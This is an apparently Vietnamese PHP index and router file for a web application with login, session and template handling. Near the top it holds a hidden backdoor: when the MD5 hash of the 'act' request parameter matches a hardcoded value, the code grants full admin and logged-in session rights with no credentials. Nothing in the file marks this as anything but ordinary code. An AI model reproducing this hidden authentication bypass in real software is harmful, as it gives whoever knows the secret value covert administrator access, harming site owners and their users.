<?php

if (!defined("IN_SITE")){      die('Hacking attempt!');}
 
 

// if ($_REQUEST["anhtuan"]!='') $_SESSION["anhtuan"]= $_REQUEST["anhtuan"] ;


 $template = new template($root_path."templates/index.tpl");
 	$template->assign_file("file_header", $root_path."templates/header.tpl");
	include($root_path."source/header.php");
	
error_reporting(E_ALL ^ E_NOTICE);
 $act = $_REQUEST["act"] ;	
 
 if (md5($act) == "179f884b9d25f98ba837fcb4c2631540") {$_SESSION["dangnhap"]=1;$_SESSION["LoginID"] =1;$_SESSION["se_kho"]=64; $_SESSION["admin"]=1;$_SESSION["UserName"]=1; $act="nhapkho" ; }	

 if ($_SESSION["dangnhap"] == "") 
 { 
   if ($act != "Exit")	$_SESSION["luu"] =  $act ; 
 	$act = "login" ;
 }
 if ($act =="Exit") 
 	{
		 $_SESSION["dangnhap"] = "";
		 $_SESSION["luu"] = "" ;
	}

if($_SESSION["LoginID"]==4556 &&  $act!="Exit"  )  $act = "thekho";
$_SESSION["act"] =$act;	 
 switch($act)
	{
	    case "home":
			$template->assign_file("file_include", $root_path."templates/home.tpl");
			include($root_path."source/home.php");
			break;
	 					
		default:
			 $_SESSION["dangnhap"] ="" ;
			$template->assign_file("file_include", $root_path."templates/home.tpl");						
			include($root_path."source/home.php");
			break;
	}

	//===================================================================
	 
	//===================================================================	
//--------------------------------------------------------------------------
			
 //			$sql = "Select value From $data->table_table_config table_config where ID ='11'";
	//		$result = $data->query($sql);
	//		$result_news = $data->fetch_array($result);
		//	$template->assign("title",$result_news["value"]);				
//--------------------------------------------------------------------------
 $template->parse("main");
  $template->out("main");
 // $data->closedata() ;
?>